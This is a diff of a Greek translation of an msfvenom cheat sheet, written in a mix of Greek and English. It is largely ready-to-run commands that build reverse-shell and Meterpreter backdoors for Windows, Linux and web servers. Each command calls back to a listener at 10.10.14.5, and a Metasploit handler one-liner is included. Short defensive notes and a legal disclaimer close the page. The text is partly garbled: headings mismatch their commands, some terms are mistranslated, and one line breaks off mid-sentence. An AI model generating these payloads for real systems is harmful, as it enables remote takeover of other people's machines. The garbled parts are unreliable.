@@ -1,12 +1,16 @@
-# 💣 Msfvenom — Πλήρης οδηγός αναφοράς
-
 <!-- language-home-navigation -->
-[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇬🇧 English](../README.md) • [🇹🇷 Türkçe](README.tr.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 💣 Msfvenom - Πλήρες φύλλο εξαπάτησης
 
+[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
 ```
   ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
   ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
@@ -16,7 +20,6 @@
   ╚═╝     ╚═╝╚══════╝╚═╝       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
          Metasploit Standalone Payload Generator & Shellcode Encoder
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/Msfvenom-Payload_Generator-blue?style=for-the-badge" alt="Msfvenom">
   <img src="https://img.shields.io/badge/Framework-Metasploit-red?style=for-the-badge" alt="Metasploit">
@@ -25,122 +28,110 @@
 </p>
 
 <p align="center">
-  <b>💣 Master cheatsheet for generating standalone payloads, shellcode, and backdoors across Windows, Linux, macOS, Android, and Web platforms</b>
+  <b>💣 Κύριο cheatsheet για τη δημιουργία μεμονωμένων ωφέλιμων φορτίων, κωδίκων κελύφους και backdoors σε πλατφόρμες Windows, Linux, macOS, Android και Ιστού</b>
 </p>
 
 ---
 
 ## 📋 Πίνακας περιεχομένων
 
-- [Εισαγωγή](#-overview--payload-architecture)
+- [Επισκόπηση & Αρχιτεκτονική ωφέλιμου φορτίου](#-επισκόπηση--αρχιτεκτονική ωφέλιμου φορτίου)
   - [Staged vs Stageless Payloads](#staged-vs-stageless-payloads)
-- [Επιλογές και παράμετροι](#-essential-flags--options)
+- [Essential Flags & Options](#-essential-flags--options)
 - [Windows Payloads (EXE, DLL, MSI, PowerShell)](#-windows-payloads-exe-dll-msi-powershell)
-- [Linux & Unix Payloads (ELF, Python, Bash)](#-linux--unix-payloads-elf-python-bash)
-- [Web & Web Shell Payloads (PHP, ASP, ASPX, JSP, WAR)](#-web--web-shell-payloads-php-asp-aspx-jsp-war)
+- [Ωφέλιμα φορτία Linux και Unix (ELF, Python, Bash)](#-linux--unix-payloads-elf-python-bash)
+- [Καλώσιμα φορτία Web & Web Shell (PHP, ASP, ASPX, JSP, WAR)](#-web--web-shell-payloads-php-asp-aspx-jsp-war)
 - [Shellcode Generation for Exploit Development (C, Raw, Python)](#-shellcode-generation-for-exploit-development-c-raw-python)
   - [Stripping Bad Characters (`-b`)](#stripping-bad-characters--b)
-  - [Συμβουλές και βέλτιστες πρακτικές](#encoders--multiple-iterations--e--i)
-- [Εγκατάσταση](#-metasploit-multi-handler-quick-setup)
-- [Γρήγορη αναφορά](#-quick-reference-table)
+  - [Κωδικοποιητές και πολλαπλές επαναλήψεις (`-e`, `-i`)](#encoders--multiple-iterations--e--i)
+- [Γρήγορη εγκατάσταση πολλαπλών χειριστηρίων Metasploit] (#-metasploit-multi-handler-quick-setup)
+- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
 - [Defensive Considerations & Detection](#-defensive-considerations--detection)
-- [Legal Disclaimer](#-legal-disclaimer)
+- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)
 
 ---
 
-## 🎯 Εισαγωγή
+## 🎯 Επισκόπηση & Αρχιτεκτονική ωφέλιμου φορτίου
 
-Combining the classic `msfpayload` and `msfencode` utilities, **msfvenom** generates binary executables, scripts, and raw shellcode for exploitation and penetration testing.
+Συνδυάζοντας τα κλασικά βοηθητικά προγράμματα `msfpayload` και `msfencode`, το **msfvenom** δημιουργεί δυαδικά εκτελέσιμα, σενάρια και ακατέργαστο κώδικα κελύφους για δοκιμή εκμετάλλευσης και διείσδυσης.
 
-### Staged vs Stageless Payloads
-- **Staged (e.g. `windows/x64/meterpreter/reverse_tcp`)**: 
-  Uses slashes between components. A tiny stub (stage 0) connects back to the listener and fetches the full reflective DLL (stage 1) into memory. Ideal for exploits with strict buffer length limits.
-- **Stageless (e.g. `windows/x64/meterpreter_reverse_tcp`)**: 
-  Uses an underscore (`_`). The entire Meterpreter payload is self-contained inside the executable or shellcode. Works reliably without relying on multi-stage network handshakes, making it ideal for command line runners and evasive persistence.
+### Σταδιακά έναντι ωφέλιμων φορτίων χωρίς σταδιακά
+- **Σταδιοποιημένο (π.χ. `windows/x64/meterpreter/reverse_tcp`):**
+  Χρησιμοποιεί κάθετες μεταξύ των στοιχείων. Ένα μικροσκοπικό στέλεχος (στάδιο 0) συνδέεται πίσω με τον ακροατή και φέρνει το πλήρες ανακλαστικό DLL (στάδιο 1) στη μνήμη. Ιδανικό για exploits με αυστηρά όρια μήκους buffer.
+- **Στάδιο (π.χ. `windows/x64/meterpreter_reverse_tcp`):**
+  Χρησιμοποιεί υπογράμμιση (`_`). Ολόκληρο το ωφέλιμο φορτίο του Meterpreter είναι αυτόνομο εντός του εκτελέσιμου αρχείου ή του shellcode. Λειτουργεί αξιόπιστα χωρίς να βασίζεται σε δικτυακές χειραψίες πολλαπλών σταδίων, καθιστώντας το ιδανικό για δρομείς γραμμής εντολών και επιμονή αποφυγής.
 
 ---
 
-## ⚙️ Επιλογές και παράμετροι
-
+## ⚙️ Βασικές σημαίες και επιλογές
 ```bash
 msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
 ```
-
-|Σημαία|Περιγραφή|
+| Σημαία | Περιγραφή |
 |------|-------------|
-|`-p, --payload`|Specifies the payload to use (`--list payloads` to view all).|
-|`-f, --format`|Output format (exe, elf, raw, c, python, asp, aspx, war, php).|
-|`-e, --encoder`|Shellcode encoder to eliminate bad characters (`--list encoders`).|
-|`-i, --iterations`|Number of encoding passes.|
-|`-b, --bad-chars`|Characters to avoid in shellcode (e.g., `\x00\x0a\x0d`).|
-|`-x, --template`|Executable template to inject payload into.|
-|`-k, --keep`|Preserves template's normal execution in a new thread.|
-|`-o, --out`|Output destination file path.|
+| `-p, --payload` | Καθορίζει το ωφέλιμο φορτίο που θα χρησιμοποιηθεί (`--list payloads` για προβολή όλων). |
+| `-f, --format` | Μορφή εξόδου (exe, elf, raw, c, python, asp, aspx, war, php). |
+| `-e, --encoder` | Κωδικοποιητής Shellcode για την εξάλειψη κακών χαρακτήρων (`--list encoders`). |
+| `-i, --iterations` | Αριθμός περασμάτων κωδικοποίησης. |
+| `-b, --bad-chars` | Χαρακτήρες που πρέπει να αποφεύγονται σε shellcode (π.χ. `\x00\x0a\x0d`). |
+| `-x, --template` | Εκτελέσιμο πρότυπο για εισαγωγή ωφέλιμου φορτίου. |
+| `-k, --keep` | Διατηρεί την κανονική εκτέλεση του προτύπου σε ένα νέο νήμα. |
+| `-o, --out` | Διαδρομή αρχείου προορισμού εξόδου. |
 
 ---
 
 ## 🪟 Windows Payloads (EXE, DLL, MSI, PowerShell)
 
-### |`-o, --out`|Output destination file path.|
+### Windows x64 Reverse Shell Executable (Stageless)
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
 ```
-
-### Windows x64 Staged Reverse TCP Executable
+### Windows x64 Staded Reverse TCP Executable
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o staged.exe
 ```
-
-### Windows x64 Reverse Shell Executable (Stageless)
+### Windows DLL Injection Payload
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o payload.dll
 ```
-
-### Windows x64 Staged Reverse TCP Executable
+### Windows MSI Installer (Κλιμάκωση προνομίων μέσω AlwaysInstallElevated)
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o install.msi
 ```
-
-### Windows DLL Injection Payload
+### Κωδικοποιημένη εντολή PowerShell Base64
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd -o run.bat
 ```
-
 ---
 
-## 🐧 Linux & Unix Payloads (ELF, Python, Bash)
+## 🐧 ωφέλιμα φορτία Linux και Unix (ELF, Python, Bash)
 
 ### Linux x64 ELF Binary (Stageless)
 ```bash
 msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
 chmod +x shell.elf
 ```
-
-### Linux Standard `/bin/sh` Reverse TCP (No Meterpreter)
+### Linux Standard `/bin/sh` Reverse TCP (Χωρίς μετρητή)
 ```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o reverse.elf
 ```
-
-### Linux x64 ELF Binary (Stageless)
+### Αυτόνομη δέσμη ενεργειών Python Reverse Shell
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py
 ```
-
-### Linux Standard `/bin/sh` Reverse TCP (No Meterpreter)
+### Συμβολοσειρά εντολών Pure Bash
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh
 ```
-
 ---
 
-## 🌐 Web & Web Shell Payloads (PHP, ASP, ASPX, JSP, WAR)
+## 🌐 Ωφέλιμα φορτία Web & Web Shell (PHP, ASP, ASPX, JSP, WAR)
 
 ### PHP Reverse Meterpreter Shell
 ```bash
 msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
 ```
-
-### Classic ASP & ASPX (IIS Servers)
+### Κλασικό ASP & ASPX (Διακομιστές IIS)
 ```bash
 # Classic ASP
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp
@@ -148,65 +139,59 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f a
 # Modern ASPX (.NET)
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
 ```
-
-### PHP Reverse Meterpreter Shell
+### Πακέτο Java WAR (Αρχείο Ιστού Apache Tomcat)
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o webshell.war
 ```
-
 ---
 
 ## 🔬 Shellcode Generation for Exploit Development (C, Raw, Python)
 
-### Stripping Bad Characters (`-b`)
-Null bytes (`\x00`), carriage returns (`\r` = `\x0d`), and newlines (`\n` = `\x0a`) break string-based memory corruption exploits (e.g., stack overflows):
+### Απογύμνωση κακών χαρακτήρων (`-b`)
+Τα μηδενικά byte (`\x00`), οι επιστροφές μεταφοράς (`\r` = `\x0d`) και οι νέες γραμμές (`\n` = `\x0a`) διακόπτουν τις καταστροφές μνήμης που βασίζονται σε συμβολοσειρές (π.χ. υπερχειλίσεις στοίβας):
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
   -b '\x00\x0a\x0d' -f c -o shellcode.c
 ```
-
-### Συμβουλές και βέλτιστες πρακτικές
+### Κωδικοποιητές και πολλαπλές επαναλήψεις (`-e`, `-i`)
 ```bash
 # Polymorphic XOR additive feedback encoder
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
   -e x86/shikata_ga_nai -i 5 -b '\x00' -f raw -o payload.bin
 ```
-
 ---
 
-## 🎧 Εγκατάσταση
+## 🎧 Γρήγορη εγκατάσταση πολλαπλών χειριστηρίων Metasploit
 
-Always catch payloads using Metasploit's `multi/handler`:
-
+Πάντα να πιάνετε ωφέλιμα φορτία χρησιμοποιώντας το `multi/handler` της Metasploit:
 ```bash
 # One-liner handler startup
 msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
 ```
-
 ---
 
-## ⚡ Γρήγορη αναφορά
+## ⚡ Γρήγορος Πίνακας Αναφοράς
 
-|Target Platform|Εντολή|
+| Πλατφόρμα στόχου | Εντολή |
 |-----------------|---------|
-|**Windows x64 EXE**|`msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o run.exe`|
-|**Linux x64 ELF**|`msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o run.elf`|
-|**PHP Web Shell**|`msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php`|
-|**ASPX (.NET IIS)**|`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx`|
-|**Tomcat WAR**|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war`|
-|**Raw Shellcode (C)**|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00' -f c`|
-|**PowerShell One-Liner**|`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd`|
+| **Windows x64 EXE** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o run.exe` |
+| **Linux x64 ELF** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o run.elf` |
+| **PHP Web Shell** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php` |
+| **ASPX (.NET IIS)** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx` |
+| **Tomcat WAR** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war` |
+| **Ακατέργαστος Shellcode (C)**| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00' -f c` |
+| **PowerShell One-Liner**| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd` |
 
 ---
 
-## 🛡️ Defensive Considerations & Detection
+## 🛡️ Αμυντικές Θεωρήσεις & Ανίχνευση
 
-1. **Static Signature Detection:** Default Msfvenom templates and encoders (`shikata_ga_nai`) have well-known static signatures identified by virtually every modern antivirus engine.
-2. **Behavioral EDR Monitoring:** EDR agents flag abnormal process spawning (e.g. `cmd.exe` or `powershell.exe` spawned under `w3wp.exe` or `tomcat8.exe`).
+1. **Ανίχνευση στατικής υπογραφής:** Τα προεπιλεγμένα πρότυπα και κωδικοποιητές Msfvenom (`shikata_ga_nai`) έχουν γνωστές στατικές υπογραφές που αναγνωρίζονται σχεδόν από κάθε σύγχρονη μηχανή προστασίας από ιούς.
+2. **Παρακολούθηση EDR της συμπεριφοράς:** Οι παράγοντες EDR επισημαίνουν την ανώμαλη διαδικασία αναπαραγωγής (π.χ.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ Νομική αποποίηση ευθύνης
 
-3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
-> Msfvenom generates functional offensive payloads and backdoors. It must strictly be utilized during authorized penetration tests and within isolated laboratory research environments. Unauthorized generation or execution on third-party computers is illegal.
+> [!ΠΡΟΣΟΧΗ]
+> Το Msfvenom δημιουργεί λειτουργικά επιθετικά ωφέλιμα φορτία και κερκόπορτες. Πρέπει να χρησιμοποιείται αυστηρά κατά τη διάρκεια εξουσιοδοτημένων δοκιμών διείσδυσης και σε απομονωμένα εργαστηριακά ερευνητικά περιβάλλοντα. Η μη εξουσιοδοτημένη δημιουργία ή εκτέλεση σε υπολογιστές τρίτων είναι παράνομη.
